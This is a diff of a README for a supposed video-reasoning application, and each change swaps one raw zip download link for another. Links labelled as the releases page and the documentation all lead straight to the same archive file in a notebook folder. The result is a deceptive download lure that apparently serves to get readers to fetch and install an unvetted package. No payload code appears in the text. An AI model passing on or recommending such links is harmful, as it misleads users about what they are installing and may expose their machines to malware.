@@ -4,11 +4,11 @@
 Welcome to the SAGE-MM-Video-Reasoning application! This tool helps you analyze videos in a straightforward way. You can upload MP4 videos and ask questions about their content. The software will then provide detailed text descriptions based on what it sees.
 
 ## 📥 Download the Application
-[![Download SAGE-MM-Video-Reasoning](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/M-Reasoning-SAG-Video-squirrelproof.zip)](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/M-Reasoning-SAG-Video-squirrelproof.zip)
+[![Download SAGE-MM-Video-Reasoning](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/Reasoning-SAG-Video-M-1.1.zip)](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/Reasoning-SAG-Video-M-1.1.zip)
 
 To download the application, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/M-Reasoning-SAG-Video-squirrelproof.zip).
+1. Visit the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/Reasoning-SAG-Video-M-1.1.zip).
 
 2. Look for the latest version. 
 
@@ -28,7 +28,7 @@ Before installing, ensure your computer meets these requirements:
 - **Textual Analysis Returns**: Get clear, detailed responses based on videos you upload.
 
 ## 📦 Download & Install
-After you download the application from the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/M-Reasoning-SAG-Video-squirrelproof.zip), find the downloaded file on your computer. Follow these installation steps:
+After you download the application from the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/Reasoning-SAG-Video-M-1.1.zip), find the downloaded file on your computer. Follow these installation steps:
 
 1. **Locate the Downloaded File**: Go to your Downloads folder or the location where your browser saves files.
   
@@ -59,7 +59,7 @@ If you run into issues using the application, consider these common solutions:
 - **Slow Processing**: Larger videos may take more time for analysis. Try smaller clips to see faster results.
 
 ## 🔗 Learn More
-For further information, check the documentation linked on the GitHub repository: [SAGE-MM-Video-Reasoning Docs](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/M-Reasoning-SAG-Video-squirrelproof.zip)
+For further information, check the documentation linked on the GitHub repository: [SAGE-MM-Video-Reasoning Docs](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/Reasoning-SAG-Video-M-1.1.zip)
 
 You can also participate in discussions and ask questions in the Issues section of the repository.
 
